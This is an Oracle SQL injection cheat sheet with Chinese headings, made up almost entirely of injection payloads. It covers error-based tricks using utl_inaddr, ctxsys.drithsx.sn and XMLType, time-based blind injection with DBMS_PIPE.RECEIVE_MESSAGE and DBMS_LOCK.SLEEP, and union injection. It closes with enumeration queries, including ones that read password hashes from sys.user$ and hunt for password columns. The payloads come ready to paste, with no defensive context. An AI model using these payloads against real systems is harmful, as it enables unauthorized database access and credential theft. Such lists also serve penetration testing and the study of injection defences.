## 报错注入
```sql
1' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual)) -- //获取主机名
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual

1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1)) -- //全文检索并返回语句执行结果
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual

1' AND (SELECT upper(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual) IS NOT NULL -- //将字符串转换为XML类型
SELECT to_char(dbms_xmlgen.getxml('select "'||(select user from sys.dual)||'" FROM sys.dual')) FROM dual
SELECT rtrim(extract(xmlagg(xmlelement("s", username || ',')),'/s').getstringval(),',') FROM all_users

SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual
SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual
SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users
SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))
XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()
XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()
```

## 盲注
```sql
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',10) -- //该函数用于从指定的管道中接收消息，如果没有消息，那么会等待一定的时间，直到超时或收到消息为止
1' AND 1=DBMS_LOCK.SLEEP(10) -- //该函数用于让一个过程休眠一定的秒数，攻击者可以使用该函数来制造人为的延时
1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) AND '1'=(SELECT CASE WHEN user='SYS' THEN '1' ELSE '0' END FROM dual) -- //从指定的管道中接收消息，如果没有消息，那么会等待一定的时间，直到超时或收到消息为止
1' AND 1=(SELECT COUNT(*) FROM all_objects) -- //利用数据库中的一些操作，如查询大量的数据、进行复杂的计算等，来增加数据库的处理时间，从而影响网页的加载时间

SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)
SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);
SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';
SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';
1' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) --
1' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)) --
1' AND (SELECT upper(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) FROM dual) IS NOT NULL --

1' AND 1=(SELECT 1/0 FROM dual) -- //利用数据库中的一些逻辑错误，如除以零、字符串转换为数字等，来触发数据库的错误信息
```

## 联合注入
```sql
SELECT user FROM dual UNION SELECT * FROM v$version
SELECT user FROM dual UNION (SELECT * FROM v$version)
SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version)
```

## 查询语句
```sql
查看版本
SELECT user FROM dual UNION SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;

查看主机名
SELECT host_name FROM v$instance; (Privileged)
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;

数据库名称
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;

数据库凭据
SELECT username FROM all_users;
SELECT name, password from sys.user$;
SELECT name, spare4 from sys.user$;

列出数据库
SELECT DISTINCT owner FROM all_tables;
列：
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';
表：
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
```
